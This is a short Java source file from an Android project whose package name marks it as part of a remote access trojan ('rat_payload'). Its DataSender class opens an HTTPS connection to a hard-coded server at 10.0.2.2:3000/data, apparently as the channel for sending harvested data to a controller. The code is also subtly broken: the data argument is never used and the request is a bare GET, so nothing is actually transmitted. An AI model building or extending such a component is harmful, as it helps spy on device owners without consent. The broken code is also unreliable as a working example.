package com.app.rat_payload.utils;

import android.os.AsyncTask;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;

/**
 * Created by anirudh on 1/1/17.
 */

public class DataSender extends AsyncTask<String, String, String>{

   /**
    * Constructor
    *
    */
    public DataSender() {

    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
    }

    @Override
    protected String doInBackground(String... params) {

        return send(params[0]);
    }

    @Override
    protected void onPostExecute(String result) {
        System.out.println(result);
    }

    /**
     * Send Data
     *
     * @param data string data to be sent to api.
     */
    public String send(String data) {

        try {
            URL url = new URL("https://10.0.2.2:3000/data");

            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");

            StringBuilder result = new StringBuilder();
            BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = rd.readLine()) != null) {
                result.append(line);
            }
            rd.close();

            return result.toString();


        } catch (Exception e) {
            e.printStackTrace();
        }

        return "SENDING DATA FAILED";


    }



}
